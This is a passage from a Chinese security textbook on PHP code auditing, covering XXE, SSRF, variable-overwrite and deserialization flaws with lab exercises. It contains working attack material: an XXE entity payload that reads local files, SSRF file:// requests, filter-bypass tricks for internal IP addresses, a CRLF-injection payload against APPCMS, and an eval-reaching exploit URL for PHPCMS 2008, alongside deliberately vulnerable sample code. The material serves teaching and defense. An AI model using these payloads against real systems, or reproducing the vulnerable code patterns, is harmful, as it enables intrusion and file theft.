l 根据$postObj->MsgType的值调用MsgTypeEvent方法进行处理，并赋值给变量$resultStr。

l 打印$resultStr变量值前台页面。

目前，可确定上述代码存在XXE漏洞的敏感函数simplexml_load_string，同时该函数该函数的参数$form_xml可控且未经过过滤，因此存在XXE漏洞。

（2）漏洞利用分析

虽然已经存在XXE漏洞，但是XXE漏洞的Payload并不确定。该CMS将用户输入内容调用MsgTypeEvent方法处理赋值给$resultStr，最终将该变量打印。而MsgTypeEvent方法中又调用event_key_text方法将用户输入$postObj进行处理，代码如下：



public function event_key_text(**$postObj**, $content, $funcFlag = 0)

{

  if (! empty($content)) {

​    **$xmlTpl** = "<xml>

​            **<ToUserName><![CDATA[%s]]></ToUserName>**

​            **<FromUserName><![CDATA[%s]]></FromUserName>**

​            <CreateTime>%s</CreateTime>

​            <MsgType><![CDATA[text]]></MsgType>

​            <Content><![CDATA[%s]]></Content>

​            <FuncFlag>%d</FuncFlag>

​          </xml>";

​    **$resultStr =** sprintf(**$xmlTpl**, **$postObj->FromUserName, $postObj->ToUserName,** time(), $content, $funcFlag);

​    **return $resultStr;**

  }else{

​    return '';

  }}



上述代码将用户输入$postObj的FromUserName属性和ToUserName属性传递至变量$xmlTpl中，最终将其赋值给$resultStr返回至前台并打印。因此，可以构造Payload中包含ToUserName属性和MsgType属性注入该程序中。构造的Payload如下：



<?xml version="1.0" encoding="utf-8"?> 

<!DOCTYPE **xxe** [<!ELEMENT name ANY ><!ENTITY xxe SYSTEM "file:///C:/windows/flag.txt" >]> 

<root>**<MsgType>text</MsgType>** 

**<ToUserName>&xxe;</ToUserName>**

</root> 



至此给出该CMS的XXE漏洞利用流程，如图9-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image466.jpg)

图9-2 XXE漏洞利用链图

（3）漏洞测试

发送请求http://127.0.0.1/cltphp/wchat/wchat/getMessage.html，将构造的Payload使用Post方法发送。响应的数据包如图9-3所示，其中FromUserName字段读取了C:/windows/flag.txt文件的内容并显示出来。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image468.jpg)

图9-3 XXE漏洞响应数据包图

## 9.5 SSRF漏洞挖掘

### 9.5.1 SSRF漏洞简介

SSRF（Server-Side Request Forger）漏洞名为服务端请求伪造。攻击者利用SSRF漏洞由服务器端发起伪造请求，从而访问内部网络数据并进行内网信息探测或内网漏洞利用。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正因为它是由服务器端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。

### 9.5.2 SSRF漏洞挖掘经验

SSRF漏洞的挖掘通常包括两种，分别是根据功能挖掘、根据函数挖掘、根据URL关键字挖掘漏洞。

1.根据功能挖掘

在网站应用中，SSRF漏洞经常出现的功能点包括：网页分享、在线转码、在线翻译、图片加载等与访问资源相关的页面。下面对SSRF漏洞相关的功能进行介绍：

l 通过URL地址分享网页内容

早期Web应用的分享功能中，为了更好的提供用户体验，Web应用通常会获取目标URL地址网页内容中的<tilte></title>标签或者<meta name="description" content=“”/>标签中content的文本内容作为显示，以提供更好的用户体验。而如果在此功能中没有对目标地址的范围进行过滤与限制，则就存在SSRF漏洞。

l 在线转码服务

由于手机屏幕大小的关系，直接浏览网页内容的时候会造成许多不便，因此有些公司提供了转码功能，把网页内容通过相关手段转为适合手机屏幕浏览的样式。例如百度、腾讯、搜狗等公司都有提供在线转码服务。在线转码访问的地址未进行过滤将导致SSRF漏洞。

l 在线翻译

Web应用中通过URL地址翻译对应文本的内容，而SSRF漏洞也可利用该URL地址访问内网资源。

l 图片加载与下载

Web应用通过URL地址加载图片地址。例如：在有些公司中加载内网图片服务器上的图片用于展示。开发者为了更好的用户体验通常对图片做些微小调整（加水印、压缩等），所以可能造成SSRF问题。

l 图片、文章收藏功能

文章收藏就类似于功能分享功能中获取URL地址中title以及文本的内容作为显示，目的还是为了更好的用户体验，而图片收藏就类似于图片加载引起的SSRF漏洞。

l 未公开的api实现及其他调用URL的功能

此类似功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容引起的SSRF漏洞。

2.根据函数挖掘

下面对SSRF漏洞相关的函数进行介绍：

全局搜索后台代码中的常见函数：curl_*()、file_get_contents()、fsocketopen()等，查看这些函数传递的URL是否存在过滤情况，若过滤不够严格将存在SSRF漏洞。

3.根据URL关键字挖掘

可通过分析请求的URL中关键字判断是否存在SSRF漏洞，常见的关键字包括：share、wap、url、link、src、source、target、u、display、imageUrl、sourceURI、domain等。

例如某网站调用外部资源的网址为“http://widget.renren.com/*****?resourceUrl=https://www.sobug.com”，如图9-4所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image470.gif)

图9-4 外部资源调用图

## 9.6 SSRF漏洞分类

根据使用函数不同，一般将SSRF漏洞分为：CURL引起的SSRF、file_get_contents引起的SSRF、fsocketopen引起的SSRF，本小节将对上述三种类型的SSRF漏洞代码进行介绍。

### 9.6.1 CURL引起的SSRF

1.审计案例代码如下：



<?php

$url=$_GET['url'];

$ch=curl_init($url); //根据参数url初始化一个url会话，返回一个CURL句柄

curl_setopt($ch, CURLOPT_HEADER, 0); //设置发送请求的HTTP头数组

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

// 将curl_exec()获取的信息以文件流的形式返回，而不直接输出

$result=curl_exec($ch);//执行请求

curl_close($ch);    //关闭请求

echo ($result);    //打印请求结果

?>



2.分析漏洞：

上述代码使用curl_*函数进行网络数据设置并发送请求，传递HTTP的请求参数url加载网络资源。但程序并未对参数url的值进行过滤，导致攻击者可通过该参数访问内网资源，形成SSRF漏洞。

用户可通过输入请求：“http://ip/code1.php?url=file://C:/Temp/flag.txt”读取文件内容，效果如图9-5所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image472.jpg)

图9-5 SSRF漏洞利用图1

### 9.6.2 file_get_contents引起的SSRF

1.审计案例代码如下：



<?php

$url = $_GET['url'];

echo file_get_contents($url);

?>



2.分析漏洞：

file_get_contents该函数用于把文件的内容读入到一个字符串中。当输入的参数为URL时，将访问对应网站。但该函数不仅可以访问网页，同时还可以访问文件内容。当用户访问输入请求：“http://ip/code3.php?url= C:/Temp/flag.txt”即可读取文件内容，如图9-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image474.jpg)

图9-6 SSRF漏洞利用图2

### 9.6.3 fsocketopen造成的SSRF

1.审计案例代码如下：



<?php

function Getfile($host, $port){

  $fp = **fsockopen($host, intval($port), $errno, $errstr, 30);//** **fsockopen****用于打开一个网络连接或者一个Unix 套接字连接，实现对用户指定url数据的获取。该**

**函数会使用socket跟服务器建立tcp连接，进行传输原始数据。**

  if(!$fp){

​    echo "$errstr (error number $errno) \n";

  }else{

​    $out = "GET / HTTP/1.1\r\n"; //拼接打印信息

​    $out .= "HOST $host \r\n";

​    $out .= "Connection: Close\r\n\r\n";

​    $out .= "\r\n";

​    fwrite($fp, $out); //将连接与信息打印值页面

​    while(!feof($fp)){

​      $contents = fgets($fp, 1024);}

​    fclose($fp);

​    return $contents;}}



2.分析漏洞：

fsockopen函数用于打开一个网络连接，其参数包括：主机名、端口、错误号、错误字符串、等待时间。若程序中对主机名及端口号过滤不严格，将导致SSRF漏洞的产生。

## 9.7 SSRF漏洞绕过

  本小节将给出SSRF漏洞绕过的方法，此方法能够在一定程度上绕过某些CMS的防御函数，如下：

（1）利用解析URL绕过

某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤，这时可能会出现对URL参数解析不当，导致可以绕过过滤。

例如：访问 http://www.test.com@10.10.10.10 与访问 http://10.10.10.10 的内容一致。

（2）IP地址转换为进制绕过

一些开发者会通过对传来的URL参数进行正则匹配的方式来过滤内网IP，对于这种过滤可以采用IP地址转换的方式绕过。

例如：192.168.0.1地址可以转换为：

l 8进制：0300.0250.0.1

l 16进制：0xC0.0xA8.0.1

l 10进制整数格式：3232235521

l 16进制整数格式：0xC0A80001

（3）  利用xp.io、xp.name绕过

当用户访问网址的子域名时，如：192.168.0.1.xip.io。该地址将自动重定向到192.168.0.1。因此可以利用302跳转的方式进行绕过。（即将IP地址设置为IP.xip.io）。

（5）句号绕过及端口绕过

将点“.”替换为句号“。”绕过正则表达式：127。0。0。1将认定为127.0.0.1；

为IP地址添加端口号绕过正则表达式：127.0.0.1:80。

## 9.8 SSRF漏洞防御

SSRF漏洞防御的主要问题在于网站访问外部资源是否过滤严格，下面给出SSRF漏洞防御建议：

（1）过滤网站访问外部资源的返回信息，验证远程服务器对请求的响应。如果Web应用获取某一种类型的文件，那么在返回结果展示给用户之前先验证返回的信息是否符合标准。

（2）统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态，从而防御SSRF漏洞导致的信息泄露。

（3）限制请求的端口为http常用的端口，例如：80、443、8080、8090等。

（4）网站访问内网资源时，要设置黑名单内网IP过滤，避免采用被用来获取内网数据从而攻击内网。

（5）禁用不必要的协议，例如：file://、ftp://、gopher://等。仅允许使用http或https请求。

## 9.9 SSRF审计CMS实践

### 9.9.1  实验：APPCMS2.0 SSRF审计

· 实验介绍

本实验将对APPCMS V2.0版本进行代码审计工作，审计该CMS中是否存在SSRF漏洞。

· 预备知识

参考9.5节：SSRF漏洞挖掘；9.6节：SSRF漏洞分类。

· 实验目的

掌握SSRF漏洞的审计方法。

· 实验环境

Windows操作系统主机；APPCMS 2.0安装包；PhpStorm工具。

· 实验步骤

（1）审计阶段

对APPCMS进行SSRF漏洞审计，全局搜索命令执行漏洞的常见函数。使用Seay代码审计工具对该网站源码进行扫描，扫描发现/pic.php文件中的readfile函数可能存在漏洞（该扫描工具将其称为任意文件读取，但实际上此处为SSRF漏洞），如表9-1所示。因此，对该文件代码进行审计

表9-1 seay扫描结果

| 7    | 读取文件函数中存在变量，可能存在任意文件读取漏洞 | /pic.php | readfile($img_url); |
| ---- | ------------------------------------------------ | -------- | ------------------- |
|      |                                                  |          |                     |

/pic.php文件代码如下：



<?php

if(isset($_GET['url']) && trim($_GET['url']) != '' && isset($_GET['type'])) {

  $img_url=trim($_GET['url']);   //去掉空白字符

  $img_url = base64_decode($img_url);   //把url参数做base64解码、说明传入时是base64编码的

  $img_url=strtolower(trim($img_url));   //把img_url转化为小写

  $_GET['type']=strtolower(trim($_GET['type']));   //把type转为小写

  $urls=explode('.',$img_url);   //使用.分割img_url，如果是1.png

  if(count($urls)<=1) die('image type forbidden 0');  //如果urls数组小于或者等于1，则终止输出image type forbidden 0

  $file_type=$urls[count($urls)-1];   //取得数组倒数第一个值，获取文件类型

  if(in_array($file_type,array('jpg','gif','png','jpeg'))){}else{ die('image type foridden 1');} //判断图片类型是不是’jpg’,’gif’,’png’,’jpeg’这几种，如果是的话什么都不做，如果不是的话则输出 image type foridden 1

  if(strstr($img_url,'php')) die('image type forbidden 2'); //防护解析漏洞

  if(strstr($img_url,chr(0)))die('image type forbidden 3'); //判断空字符截断

  if(strlen($img_url)>256)die('url too length forbidden 4'); //判断了url长度不能大于256

  header("Content-Type: image/{$_GET['type']}"); //这里是重点，type是响应类型，这个参数是可控的

  readfile($img_url); //开始读文件

} else {

  die('image not find！');

}?>



上述代码流程为：

l 使用HTTP的GET方式传递参数url和参数type；

l 对参数url进行防护处理，包括：首尾去空格、base64解码、转换为小写；

l 对参数url传递的文件名称按照点“.”进行分隔，取得点号后的文件类型，判断是否在白名单中('jpg','gif','png','jpeg')。

l 参数url中不允许存在关键字“php”、字符“0”、长度小于等于256。

l 对参数type进行首尾去空并转换为小写，将其作为HTTP头中的Content-type。

l 调用readfile函数读取url文件。

若参数url可控，同时绕过上述防护，即可控制readfile函数读取页面文件。

（2）SSRF漏洞利用

使用该漏洞跳转到百度网站，将跳转网站“http://www.baidu.com/?1.png”进行base64编码为“aHR0cDovL3d3dy5iYWlkdS5jb20vPzEucG5n”。然后，构造该网站的Payload为“http://127.0.0.1/appcms/pic.php?url=aHR0cDovL3d3dy5iYWlkdS5jb20vPzEucG5n&type=png%0A%0Dtest”。

其中url参数的值为上述base64编码后结果，type参数为“png%0A%0Dtest”， 0A%0D分别是换行符和回车符的URL编码后结果，此方式也称为CRLF注入漏洞（CRLF注入漏洞，是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞）。上述Payload执行后，结果如图9-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image476.jpg)

图9-7 APPCMS SSRF漏洞利用图

## 9.10 单元小结

本单元主要学习了代码审计中的XXE与SSRF安全问题，通过经典代码案例，对这些漏洞的代码、分类进行介绍，使读者熟悉审计XXE与SSRF漏洞。与此同时，给出存在漏洞的CMS审计流程。



 

# 单元10 变量覆盖与反序列化漏洞审计

本单元介绍了代码审计中变量覆盖漏洞、反序列化漏洞的审计，其主要分为三部分进行介绍。

第一部分介绍变量覆盖漏洞的基础知识，包括：变量覆盖漏洞的基本概念、漏洞审计方法、漏洞防御方法等。

第二部分介绍变量覆盖漏洞的常见函数案例，包括：extract函数、parse_str函数、import_request_variables函数、全局变量覆盖、$$变量覆盖。通过给出PHP漏洞代码，让读者了解漏洞代码案例，并使用phpcms2008进行变量覆盖漏洞审计实践。

第三部分介绍PHP中序列化与反序列化功能，通过代码案例了解反序列化漏洞。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image478.jpg)

**单元目标：**

\1.  了解变量覆盖漏洞的原理、挖掘技巧；

\2.  掌握变量覆盖漏洞的常见代码审计方法；

\3.  掌握变量覆盖漏洞的防御方法；

\4.  理解反序列漏洞的审计方法；

## 10.1 变量覆盖漏洞挖掘

### 10.1.1 变量覆盖漏洞简介

变量覆盖漏洞是指攻击者使用自定义的变量去覆盖源代码中的变量，从而改变代码逻辑，实现攻击目的的一种漏洞。通常来说，单独的变量覆盖漏洞很难有利用价值，因此该漏洞通常要与程序中的其他功能进行结合来实现完整攻击，其造成的危害可能是无法估量的。例如：某网站中的购买商品支付系统若存在变量覆盖漏洞，则可能导致0元支付下单的情况。某网站中的上传文件功能若存在该漏洞，则可能导致任意扩展名覆盖上传白名单列表，覆盖PHP的扩展名并上传恶意PHP脚本。

变量覆盖漏洞主要由两类产生情况：函数使用不当、$$可变变量覆盖原有变量。

l 函数使用不当

引发变量覆盖漏洞的函数包括：extract()、import_request_variables()、parse_str()、开启全局变量注册register_globals=On（PHP5.4之后正式移除此功能）等。

l $$可变变量覆盖原有变量

使用$$方式注册变量过程中，由于未对注册变量名称进行验证，从而导致变量覆盖漏洞。

### 10.1.2 变量覆盖漏洞审计经验

变量覆盖漏洞通常会结合Web应用的其他功能代码实现完整的攻击流程，例如：代码执行、命令执行、逻辑绕过等漏洞。可用的变量覆盖漏洞需要考虑两个方面：挖掘和利用。同时，存在变量覆盖漏洞的变量一定要审计该变量使用前后的调用情况，才能充分挖掘与利用。

变量覆盖漏洞审计包括如下方法：

l 对于函数extract()与parse_str()而言，使用敏感函数参数回溯法审计参数传递过程是否可控。

l 对于函数import_request_variables()而言，其相当于开启了全局变量注册。需要审计程序中没有初始化并操作之前没有赋值的变量（PHP4至4.1.0和PHP5至5.4.0版本可用）。

l 对于$$而言，可以通过搜索关键字“$$”，挖掘程序漏洞。同时，可对程序中几个核心文件通读一遍并了解程序框架。

### 10.1.3 变量覆盖漏洞防御

变量覆盖漏洞的防御策略主要包括以下两点：

l 为变量赋值时使用原始的变量数组；

l 该漏洞在做变量注册时未验证变量是否存在。

（1）使用原始变量数组

在进行程序设计开发时，尽量不使用注册变量，并直接使用原生的$_GET、$_POST等数组变量进行操作，如果考虑程序可读性等原因，需要注册个别变量，可以直接在代码中定义变量，然后再把请求中的值赋值给它。

（2）验证变量是否存在

为了解决变量覆盖的问题，需要在注册变量前判断变量是否存在，需要注意以下三点：

l 使用extract()函数则可配置第二个参数为EXTR_SKIP。如：extract(x,EXTR_SKIP)。

l 使用parse_str()函数注册变量前需要先自行通过代码判断变量是否存在。

l 自定义的变量一定要初始化，不然即使注册变量代码在执行流程最前面也能覆盖掉这些未初始化的变量。

## 10.2 变量覆盖漏洞案例

  本小节将引起变量覆盖漏洞的常见函数及方式进行介绍，包括：extract()、import_request_variables()、parse_str()、开启全局变量注册、$$。

### 10.2.1 extract函数使用不当

extract()函数的用法是从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量并返回设置的变量数目。extract函数结构如下：

extract(array,extract_rules,prefix)

l array：规定要使用的数组；

l extract_rules：检查每个键名是否合法，同时检查和符号表中已存在的变量名是否冲突并进行处理；

l prefix：该参数仅在extract_type的值是EXTR_PREFIX_SAME、EXTR_PREFIX_ALL、EXTR_PREFIX_INVALID、EXTR_PREFIX_IF_EXISTS时需要。如果附加了前缀后的结果不是合法的变量名，将不会导入到符号表中。

该函数导致变量覆盖漏洞主要由其第二个参数决定，导致该漏洞有如下两种情况：

l 当extract_rules参数为空或EXTR_OVERWRITE时，它表示如果有冲突，则覆盖已有的变量。

l 当extract_rules参数为EXTR_IF_EXISTS 时，它表示仅在当前表中已有同名变量时，覆盖它们的值，其他的都不注册新变量。

extract函数案例代码如下：



<?php

$a = 1;

print_r("extract()执行之前：\$a = ".$a."<br />");

$b = array('a'=>'2');

extract($b);

print_r("extract()执行之后：\$a = ".$a."<br />");

?>



上述代码首先定义变量$a值为1，然后定义数组并使用extract函数进行变量$a值覆盖并进行打印。输入路径：http://ip/extract.php访问网站根路径下extract.php文件，如图10-1所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image480.jpg)

图10-1 extract变量覆盖测试图

### 10.2.2 parse_str函数使用不当

parse_str()函数的作用是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否已经存在，所以会直接覆盖掉已有的变量。parse_str函数结构如下：

parse_str(string,array)

l string：规定要解析的字符串（必选）；

l array：规定存储变量的数组名称，该参数指示变量存储到数组中（可选）。

parse_str函数案例代码如下：



<?php

$var='init';

parse_str($_SERVER['QUERY_STRING']);

print $var;

?>



上述代码首先定义变量$var值为init，然后定义数组并使用parse_str函数进行变量$var值覆盖并进行打印。输入路径：http://ip/test.php?var=new访问网站根路径下test.php文件，如图10-2所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image482.gif)

图10-2 parse_str变量覆盖测试图

### 10.2.3 import_request_variables函数使用不当

Import_request_variables()函数的作用是把GET、POST、Cookie的参数注册成变量，且该函数只能在PHP4.1至PHP5.4之间。import_request_variables()函数的结构如下：

import_request_variables(string $types,string $prefix)

l types：指定要导入的变量，可以用字母G、P和C分别表示GET、POST、COOKIE（可以使用g、p、c，字母不区分大小写）；

l prefix：变量名的前缀，置于所有被导入到全局作用域的变量之前。所以如果你有个名为userid的GET变量，同时提供了pref_作为前缀，那么就可获得一个名为$pref_userid的全局变量。

import_request_variables函数案例代码如下：



<?php

$auth = '0';

import_request_variables('G');

if($auth == 1){

 echo "private!";

}else{

 echo "public!";}

?>



上述代码首先定义变量$auth值为0，然后import_request_variables('G')指定导入GET请求中的变量，从而导致变量覆盖$auth。当用户输入http://ip/test1.php?auth=1时，网页上会输出“private！”，如图10-3所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image484.gif)

图10-3 import_request_variables变量覆盖图

### 10.2.4 全局变量覆盖

全局比变量覆盖案例代码如下：



<?php

echo "Register_globals: ".(int)ini_get("register_globals")."<br/>";

if ($auth){

  echo "private!";}

?>



当register_globals=OFF时，上述代码无法将未初始化的变量进行注册，访问URL为http:// ip/test1.php?auth=1，显示页面如图10-4所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image486.gif)

图10-4 全局变量覆盖测试图1

当register_global=ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等。提交请求URL：http://ip /test.php?auth=1，变量$auth将自动得到赋值，显示页面如图10-5所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image488.gif)

图10-5全局变量覆盖测试图2

还有一种情况，通过$GLOBALS获取的变量在使用不当时也会导致变量覆盖，漏洞触发前提是register_globals为ON，可以通过GLOBALS[a]来改变$a的值，案例代码如下：



<?php

echo "Register_globals:".(int)ini_get("register_globals")."<br/>";

if (ini_get('register_globals')) foreach($_REQUEST as $k=>$v) unset(${$k});

print $a;

print $_GET[b];

?>



变量$a未初始化，当使用URL为http://ip/test2.php?GLOBALS[a]=1&b=2，尝试注入“GLOBALS[a]”以覆盖全局变量时，则可以成功控制变量“$a”的值。上述代码中unset()默认只会销毁局部变量，要销毁全局变量必须使用$GLOBALS，如图10-6所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image490.gif)

图10-6全局变量覆盖测试图3

### 10.2.5 $$变量覆盖

$$是一种可变变量的写法，它可以使一个普通变量的值作为可变变量的名字，这种类型常常会使用遍历的方式来释放变量的代码，最常见的就是foreach的遍历，示例代码如下：



<?php

$a=2;

foreach(array('$_COOKIE','_POST','_GET') as $_request)

{

  foreach($$_request as $_key=>$_value)

  {  echo $_key.'<br />';

​    $$_key= addslashes($_value);

  }}

echo $a;

?>



上述代码首先将$_COOKIE、$_POST、$_GET方法传递的请求遍历，并对每个请求中的参数与值进行抽象为$_request。$_key为COOKIE、POST、GET中的参数，$_value为$_key参数的值。变量$a=addslashes($_value);会覆盖已有的变量$a的值。

在浏览器输入http://ip/test.php?a=666，结果如图10-7所示，可以看到已经成功把变量$a的值由2覆盖成了666。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image492.gif)

图10-7 $$变量覆盖测试图

## 10.3 变量覆盖审计CMS实践

### 10.3.1  实验：PHPCMS2008变量覆盖审计

· 实验介绍

本实验将对PHPCMS 2008进行代码审计工作，审计该CMS中是否存在变量覆盖漏洞。

· 预备知识

参考9.1.1节：变量覆盖漏洞简介；9.1.2节：变量覆盖漏洞审计经验。

· 实验目的

掌握变量覆盖漏洞的审计方法。

· 实验环境

Windows操作系统主机；PHPCMS2008安装包；PhpStorm工具。

· 实验步骤

（1）审计阶段

```
对全局通用文件进行审计，点击展开/yp/web/include/common.inc.php，代码如下。程序流程为：
l  程序首先赋值一个$userid变量。
l  然后使用赋值完成变量拼接SQL语句执行，SQL语句执行完成以后返回数据给$r变量数组，如果$r变量存在内容，则将变量数组内容加入到当前文件的符号表中进行变量覆盖。
l  如果$userid变量内容为false则将显示错误页面内容。
```

l 如果$userid不为false，则进行初始化模板文件.

l 将$menu变量传输到string2array()函数。



```
<?php
defined('IN_PHPCMS') or exit('Access Denied');
//赋值$userid变量
$userid = $userid ? $userid : intval(QUERY_STRING);
//拼接SQL语句并查询
$r = $db->get_one("SELECT * FROM `".DB_PRE."member_company` WHERE `userid`='$userid'");
//如果查询有结果，则根据查询的结果调用extract函数进行变量覆盖
if($r){extract($r);}
//如果$userid为false则打印页面错误
if(!$userid)
{$MS['title'] = '你要访问的站点不存在';
 $MS['description'] = '请核对网址是否正确.';
 …省略…
 msg($MS);}
//如果$userid为true则初始化模板文件
if(empty($tplname)) $tplname = 'default';
//用户选择的默认模板
$companytpl_config = include PHPCMS_ROOT.'templates/'.TPL_NAME.'/yp/companytplnames.php';
$tpl = $companytpl_config[$tplname]['tplname'];
define('TPL', $tpl);
define('WEB_SKIN', 'templates/'.TPL_NAME.'/yp/css/');
if($diy){define('SKIN_DIY', WEB_SKIN.$userid.'_diy.css');}
else{define('SKIN_DIY', WEB_SKIN.$companytpl_config[$tplname]['style']);}
//将$menu变量传输到string2array()函数
$menu = string2array($menu);
```

…省略…



对string2array()函数代码进行审计，include/global.func.php的string2array函数存在了eval函数（代码执行漏洞敏感函数），该函数将$menu变量以PHP代码执行，代码如下：



```
function string2array($data)
{
//如果$data变量为空字符则直接返回空数组
   if($data == '') return array();
//执行\$array = $data;代码
   eval("\$array = $data;");
   return $array;
}
```



至此，得出结论：如果程序中$menu变量可控，就存在任意代码执行漏洞。该漏洞的利用条件为：

l $userid可从数据库查询内容，然后将返回内容构成数组$r。

l 使用extract()将数组的内容添加到当前符号表中并生成$menu变量。

l 但是，如果数据库查询为空，则无法生成变量$menu。这就需要通过其他代码生成新$menu变量（下文common.inc.php文件可生成新$menu变量）。

include/common.inc.php文件代码如下，其会将GET、POST、Cookie转换成变量，所以可利用该代码提前生成$menu变量和$userid变量，并且把$userid内容置为数据库不存在的内容，$menu变量内容为想要执行的恶意代码。例如：$userid置为userid=123456，$menu置为menu=phpinfo();exit;。



if($_REQUEST)
 { //判断MAGIC_QUOTES_GPC是否开启
  if(**MAGIC_QUOTES_GPC**)
  {
    $_REQUEST = new_stripslashes($_REQUEST);
    if($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);
    extract($db->escape($_REQUEST), EXTR_SKIP);}
  else
  { //若未开启MAGIC_QUOTES_GPC则执行下方代码
    $_POST = $db->**escape**($_POST);//调用自定义escape函数对参数进行过滤
    $_GET = $db->**escape**($_GET);
    $_COOKIE = $db->**escape**($_COOKIE);
    **@extract($_POST,EXTR_SKIP);//****变量覆盖生成新$menu变量
    @extract($_GET,EXTR_SKIP);
    @extract($_COOKIE,EXTR_SKIP);}
**  if(!defined('IN_ADMIN')) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);
  if($_COOKIE) $db->escape($_COOKIE);}



（1）  确定该功能访问流程

该变量覆盖漏洞的利用流程如图10-8所示，首先从/yp/web/index.php文件中包含common.inc.php文件并调用extract函数将GET、POST、Cookie转换成变量。访问/yp/web/include/common.php文件，通过传递参数userid和menu来控制函数执行流程，如图9-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image494.jpg)

图10-8 函数执行流程图

（2）  变量覆盖漏洞利用

访问路径：http://ip/yp/web/index.php?userid=123456&menu=phpinfo();exit;。

该路径传递参数userid为123456，参数menu为phpinfo();exit()。首先执行extract函数设置userid和menu的参数值，然后调用/yp/web/include/common.php文件通过参数控制函数执行流程，最后调用eval函数执行恶意代码，漏洞利用如图10-9所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image496.jpg)

图10-9 变量覆盖漏洞利用图

## 10.4 反序列化漏洞

为了有效地存储或传递数据，同时不丢失其类型和结构，很多程序经常使用序列化和反序列化函数对数据进行处理。序列化函数返回字符串，此字符串包含了表示值的字节流，可以存储于任何地方。反序列函数对单一的已序列化变量进行操作，将其转换回原来的值。这两个过程结合起来可以实现数据的存储和传输数据，使程序更具维护性。

### 10.4.1 序列化介绍

PHP语言中常见的序列化和反序列化函数有serialize、unserialize、json_encode和json_decode，下面对几种常见类型数据的序列化进行介绍。

（1）  NULL类型的序列化

在PHP语言中NULL类型序列化后为N，示例代码如下：



<?php

$t=NULL;

$tr=serialize($t);

echo "serialize NULL result: ".$tr;

?>



输出结果为：serialize NULL result: **N**;。

（2）  boolean类型的序列化

在PHP语言中boolean类型数据序列化后为b:<digit>，其中<digit>为0或者1，0表示boolean类型的false，1表示boolean类型的true。示例代码如下：



<?php

$t=true;$f=false;

$tr=serialize($t);

$fa=serialize($f);

echo "serialize true result: ".$tr;

echo "serialize false result: ".$fa;

?>



输出结果为：serialize true result: **b:1**;serialize false result: **b:0**;。

（3）  数组类型的序列化

在PHP语言中数组通常被序列化为：a:<n>:{<key1><value1><key2><value2>…<keyn><valuen>}，其中<n>表示数组元素个数，<key1><key2>…<keyn>表示数组下标，<value1><value2>…<valuen>表示与下标对应的数组元素的值。

对于下标类型而言，其可以是整形和字符串型，数组序列化后的格式与整数和字符串数据序列化后的格式相同。对于元素值而言，其可以是任意类型，其序列化后的格式与其所对应的类型序列化后的格式相同。

例如：数组为array(“Volvo”,“BMW”,“SAAB”)，序列化后其结果为a:3:{i:0;s:5:“Volvo”;i:1;s:3:“BMW”;i:2;s:4:“SAAB”}。i表示数组下标，s表示数组元素长度与值。

（4）  对象的序列化

在PHP语言中对象序列化后为：O:<length>:”<class name>”:<n>:{<field name 1><field value 1><field name 2><field value 2>…<field name n><field value n>}

其中<length>表示对象类名的字符串长度，<class name>表示对象的类名；<n>表示对象中字段个数，这些字段包括在对象所在类及其父类中用var、public、protected、private声明的字段，但不包括用static和const声明的静态字段，也就是只有实例字段；<filed name 1>,<filed name 2>,…,<filed name n>表示与字段名对应的字段值。

字段名是字符串型，序列化后的格式与字符串型数据序列化后的格式相同。字段值可以是任意类型，序列化后的格式与其所对应的类型序列化后的格式相同。

对象序列化示例代码如下：



<?php

header("Content-type: text/html;charset=utf-8");

class Foo{

  public **$aMemberVar**='aMemberVar Member Variable';

  public **$aFuncName**='aMemberFunc';

  function **aMemberFunc**(){

​    print 'Inside `aMemberFunc()`';

  }}

$foo = new Foo;

$tr = serialize($foo);

print $tr;

?>



输出结果为：O:3:"Foo":2:{s:10:"aMemberVar";s:26:"aMemberVar Member Variable";s:9:"aFuncName";s:11:"aMemberFunc";}。

其中，O表示对象，3表示对象类名的字符串长度为3，Foo表示对象的类名为Foo，2表示有两个数据字段（类成员）。

{s:10:"aMemberVar";s:26:"aMemberVar Member Variable";s:9:"aFuncName";s:11:"aMemberFunc";}表示具体的数据字段与字段值。

第一个字段s:10:"aMemberVar";s:26:"aMemberVar Member Variable"的含义为：

s:10:"aMemberVar"表示字段的类型为string，字段长度为10，字段的名称为aMemberVar。

（5）  其他类型的序列化

